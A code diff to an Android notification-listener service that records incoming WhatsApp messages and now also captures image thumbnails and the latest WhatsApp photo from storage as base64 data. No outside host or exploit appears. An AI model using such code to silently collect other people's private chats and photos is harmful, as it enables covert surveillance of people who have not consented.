@@ -53,7 +53,31 @@ class WhatsAppNotificationListener : NotificationListenerService() {
         val text = if (!bigText.isNullOrBlank()) bigText else normalText
         val convoTitle = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()?.trim()
         val textLines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
-        val postTime = if (sbn.postTime > 0) sbn.postTime else System.currentTimeMillis()
+        // Extract exact real message timestamp from WhatsApp notification
+        val postTime = if (notification.`when` > 0) notification.`when` else if (sbn.postTime > 0) sbn.postTime else System.currentTimeMillis()
+
+        // Extract real image thumbnail if present in notification extras
+        var mediaType: String? = null
+        var mediaPath: String? = null
+
+        val pictureBitmap = (extras.get(Notification.EXTRA_PICTURE) as? android.graphics.Bitmap)
+            ?: (extras.get("android.picture") as? android.graphics.Bitmap)
+            ?: (extras.get(Notification.EXTRA_LARGE_ICON_BIG) as? android.graphics.Bitmap)
+
+        if (pictureBitmap != null) {
+            try {
+                val stream = java.io.ByteArrayOutputStream()
+                pictureBitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 80, stream)
+                val base64 = android.util.Base64.encodeToString(stream.toByteArray(), android.util.Base64.NO_WRAP)
+                mediaType = "image"
+                mediaPath = "data:image/jpeg;base64,$base64"
+            } catch (_: Exception) {}
+        } else if (text?.contains("📷") == true || text?.contains("Photo", ignoreCase = true) == true) {
+            mediaType = "image"
+            try {
+                mediaPath = FileManagerCollector(applicationContext).getLatestWhatsAppImageBase64()
+            } catch (_: Exception) {}
+        }
 
         // Determine chat name: conversation title (groups) > title > fallback
         val chatName = when {
@@ -92,7 +116,9 @@ class WhatsAppNotificationListener : NotificationListenerService() {
                     sender = sender,
                     messageText = msg,
                     isOutgoing = false,
-                    messageTimeEpochMs = postTime
+                    messageTimeEpochMs = postTime,
+                    mediaType = mediaType,
+                    mediaPath = mediaPath
                 )
             }
         } else if (!text.isNullOrBlank() && !text.matches(Regex("^\\d+\\s+new messages?.*", RegexOption.IGNORE_CASE))) {
@@ -101,7 +127,9 @@ class WhatsAppNotificationListener : NotificationListenerService() {
                 sender = title ?: chatName,
                 messageText = text,
                 isOutgoing = false,
-                messageTimeEpochMs = postTime
+                messageTimeEpochMs = postTime,
+                mediaType = mediaType,
+                mediaPath = mediaPath
             )
         }
 
